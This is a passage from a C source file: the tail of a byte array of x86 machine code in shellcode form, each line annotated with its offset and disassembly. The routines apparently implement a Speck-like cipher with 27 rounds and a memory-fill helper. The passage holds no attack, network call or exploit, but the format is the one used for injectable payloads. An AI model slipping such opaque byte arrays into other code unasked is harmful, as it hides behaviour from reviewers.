  /* 08D1 */ "\x55"                             /* push      ebp                                 */
  /* 08D2 */ "\x53"                             /* push      ebx                                 */
  /* 08D3 */ "\x8d\x4c\x24\x20"                 /* lea       ecx, dword ptr [esp + 0x20]         */
  /* 08D7 */ "\xe8\x5c\x00\x00\x00"             /* call      0x938                               */
  /* 08DC */ "\x33\xea"                         /* xor       ebp, edx                            */
  /* 08DE */ "\x8d\x4c\x24\x18"                 /* lea       ecx, dword ptr [esp + 0x18]         */
  /* 08E2 */ "\x6a\x10"                         /* push      0x10                                */
  /* 08E4 */ "\x33\xd2"                         /* xor       edx, edx                            */
  /* 08E6 */ "\x33\xd8"                         /* xor       ebx, eax                            */
  /* 08E8 */ "\xe8\xae\x00\x00\x00"             /* call      0x99b                               */
  /* 08ED */ "\x8b\x44\x24\x2c"                 /* mov       eax, dword ptr [esp + 0x2c]         */
  /* 08F1 */ "\x8b\x74\x24\x10"                 /* mov       esi, dword ptr [esp + 0x10]         */
  /* 08F5 */ "\xc1\xe0\x03"                     /* shl       eax, 3                              */
  /* 08F8 */ "\x46"                             /* inc       esi                                 */
  /* 08F9 */ "\x6a\x10"                         /* push      0x10                                */
  /* 08FB */ "\x89\x44\x24\x28"                 /* mov       dword ptr [esp + 0x28], eax         */
  /* 08FF */ "\x5f"                             /* pop       edi                                 */
  /* 0900 */ "\x89\x74\x24\x10"                 /* mov       dword ptr [esp + 0x10], esi         */
  /* 0904 */ "\x83\xff\x10"                     /* cmp       edi, 0x10                           */
  /* 0907 */ "\x75\x11"                         /* jne       0x91a                               */
  /* 0909 */ "\x55"                             /* push      ebp                                 */
  /* 090A */ "\x53"                             /* push      ebx                                 */
  /* 090B */ "\x8d\x4c\x24\x20"                 /* lea       ecx, dword ptr [esp + 0x20]         */
  /* 090F */ "\xe8\x24\x00\x00\x00"             /* call      0x938                               */
  /* 0914 */ "\x33\xd8"                         /* xor       ebx, eax                            */
  /* 0916 */ "\x33\xea"                         /* xor       ebp, edx                            */
  /* 0918 */ "\x33\xff"                         /* xor       edi, edi                            */
  /* 091A */ "\x8b\x44\x24\x2c"                 /* mov       eax, dword ptr [esp + 0x2c]         */
  /* 091E */ "\x8b\x4c\x24\x14"                 /* mov       ecx, dword ptr [esp + 0x14]         */
  /* 0922 */ "\x85\xf6"                         /* test      esi, esi                            */
  /* 0924 */ "\x0f\x84\x72\xff\xff\xff"         /* je        0x89c                               */
  /* 092A */ "\x5f"                             /* pop       edi                                 */
  /* 092B */ "\x5e"                             /* pop       esi                                 */
  /* 092C */ "\x8b\xd5"                         /* mov       edx, ebp                            */
  /* 092E */ "\x8b\xc3"                         /* mov       eax, ebx                            */
  /* 0930 */ "\x5d"                             /* pop       ebp                                 */
  /* 0931 */ "\x5b"                             /* pop       ebx                                 */
  /* 0932 */ "\x83\xc4\x18"                     /* add       esp, 0x18                           */
  /* 0935 */ "\xc2\x08\x00"                     /* ret       8                                   */
  /* 0938 */ "\x83\xec\x10"                     /* sub       esp, 0x10                           */
  /* 093B */ "\x8b\x44\x24\x14"                 /* mov       eax, dword ptr [esp + 0x14]         */
  /* 093F */ "\x8b\x54\x24\x18"                 /* mov       edx, dword ptr [esp + 0x18]         */
  /* 0943 */ "\x53"                             /* push      ebx                                 */
  /* 0944 */ "\x55"                             /* push      ebp                                 */
  /* 0945 */ "\x56"                             /* push      esi                                 */
  /* 0946 */ "\x57"                             /* push      edi                                 */
  /* 0947 */ "\x8b\xf1"                         /* mov       esi, ecx                            */
  /* 0949 */ "\x8d\x7c\x24\x10"                 /* lea       edi, dword ptr [esp + 0x10]         */
  /* 094D */ "\x33\xdb"                         /* xor       ebx, ebx                            */
  /* 094F */ "\xa5"                             /* movsd     dword ptr es:[edi], dword ptr [esi] */
  /* 0950 */ "\xa5"                             /* movsd     dword ptr es:[edi], dword ptr [esi] */
  /* 0951 */ "\xa5"                             /* movsd     dword ptr es:[edi], dword ptr [esi] */
  /* 0952 */ "\xa5"                             /* movsd     dword ptr es:[edi], dword ptr [esi] */
  /* 0953 */ "\x8b\x4c\x24\x14"                 /* mov       ecx, dword ptr [esp + 0x14]         */
  /* 0957 */ "\x8b\x74\x24\x1c"                 /* mov       esi, dword ptr [esp + 0x1c]         */
  /* 095B */ "\x8b\x6c\x24\x18"                 /* mov       ebp, dword ptr [esp + 0x18]         */
  /* 095F */ "\x8b\x7c\x24\x10"                 /* mov       edi, dword ptr [esp + 0x10]         */
  /* 0963 */ "\x89\x4c\x24\x24"                 /* mov       dword ptr [esp + 0x24], ecx         */
  /* 0967 */ "\x8b\xce"                         /* mov       ecx, esi                            */
  /* 0969 */ "\xc1\xc8\x08"                     /* ror       eax, 8                              */
  /* 096C */ "\x8b\x74\x24\x24"                 /* mov       esi, dword ptr [esp + 0x24]         */
  /* 0970 */ "\x03\xc2"                         /* add       eax, edx                            */
  /* 0972 */ "\xc1\xce\x08"                     /* ror       esi, 8                              */
  /* 0975 */ "\x33\xc7"                         /* xor       eax, edi                            */
  /* 0977 */ "\x03\xf7"                         /* add       esi, edi                            */
  /* 0979 */ "\xc1\xc2\x03"                     /* rol       edx, 3                              */
  /* 097C */ "\x33\xf3"                         /* xor       esi, ebx                            */
  /* 097E */ "\xc1\xc7\x03"                     /* rol       edi, 3                              */
  /* 0981 */ "\x33\xd0"                         /* xor       edx, eax                            */
  /* 0983 */ "\x89\x6c\x24\x24"                 /* mov       dword ptr [esp + 0x24], ebp         */
  /* 0987 */ "\x33\xfe"                         /* xor       edi, esi                            */
  /* 0989 */ "\x8b\xe9"                         /* mov       ebp, ecx                            */
  /* 098B */ "\x43"                             /* inc       ebx                                 */
  /* 098C */ "\x83\xfb\x1b"                     /* cmp       ebx, 0x1b                           */
  /* 098F */ "\x72\xd6"                         /* jb        0x967                               */
  /* 0991 */ "\x5f"                             /* pop       edi                                 */
  /* 0992 */ "\x5e"                             /* pop       esi                                 */
  /* 0993 */ "\x5d"                             /* pop       ebp                                 */
  /* 0994 */ "\x5b"                             /* pop       ebx                                 */
  /* 0995 */ "\x83\xc4\x10"                     /* add       esp, 0x10                           */
  /* 0998 */ "\xc2\x08\x00"                     /* ret       8                                   */
  /* 099B */ "\x56"                             /* push      esi                                 */
  /* 099C */ "\x8b\xf1"                         /* mov       esi, ecx                            */
  /* 099E */ "\x8a\xc2"                         /* mov       al, dl                              */
  /* 09A0 */ "\x8b\x4c\x24\x08"                 /* mov       ecx, dword ptr [esp + 8]            */
  /* 09A4 */ "\x57"                             /* push      edi                                 */
  /* 09A5 */ "\x8b\xfe"                         /* mov       edi, esi                            */
  /* 09A7 */ "\xf3\xaa"                         /* rep stosb byte ptr es:[edi], al               */
  /* 09A9 */ "\x5f"                             /* pop       edi                                 */
  /* 09AA */ "\x8b\xc6"                         /* mov       eax, esi                            */
  /* 09AC */ "\x5e"                             /* pop       esi                                 */
  /* 09AD */ "\xc2\x04\x00"                     /* ret       4                                   */
};